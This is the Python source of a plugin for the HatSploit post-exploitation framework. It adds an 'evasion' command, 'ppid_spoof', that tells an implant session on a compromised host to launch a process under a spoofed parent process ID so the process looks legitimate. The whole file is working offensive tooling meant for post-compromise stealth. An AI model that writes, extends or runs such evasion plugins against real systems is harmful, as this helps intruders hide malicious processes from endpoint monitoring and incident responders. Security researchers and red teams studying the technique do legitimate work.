"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin

PPID_BASE = 26

PPID_SPAWN = tlv_custom_tag(API_CALL_STATIC, PPID_BASE, API_CALL)

TLV_TYPE_PPID_PARENT = tlv_custom_type(TLV_TYPE_INT, PPID_BASE, API_TYPE)
TLV_TYPE_PPID_CMD = tlv_custom_type(TLV_TYPE_STRING, PPID_BASE, API_TYPE)
TLV_TYPE_PPID_CHILD = tlv_custom_type(TLV_TYPE_INT, PPID_BASE, API_TYPE + 1)


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "PPID Spoof Plugin",
            'Plugin': "ppid_spoof",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': "Spawn a process with a spoofed parent PID.",
        })

        self.commands = [
            Command({
                'Category': "evasion",
                'Name': "ppid_spoof",
                'Description': "Spawn a process with a spoofed parent PID.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-p', '--parent'),
                        {
                            'help': "Parent PID to spoof.",
                            'type': int,
                            'required': True,
                        }
                    ),
                    (
                        ('-c', '--cmd'),
                        {
                            'help': "Command line to execute (default: notepad.exe).",
                            'default': 'notepad.exe',
                        }
                    ),
                ]
            })
        ]

    def ppid_spoof(self, args):
        self.print_process(
            f"Spawning '{args.cmd}' under parent PID {args.parent}..."
        )

        result = self.session.send_command(
            tag=PPID_SPAWN,
            plugin=self.plugin,
            args={
                TLV_TYPE_PPID_PARENT: args.parent,
                TLV_TYPE_PPID_CMD: args.cmd,
            }
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(
                "Failed to spawn process! Ensure the parent PID exists "
                "and you have PROCESS_CREATE_PROCESS access."
            )
            return

        child_pid = result.get_int(TLV_TYPE_PPID_CHILD)
        self.print_success(
            f"Process spawned (PID {child_pid}) under parent {args.parent}."
        )

    def load(self):
        pass
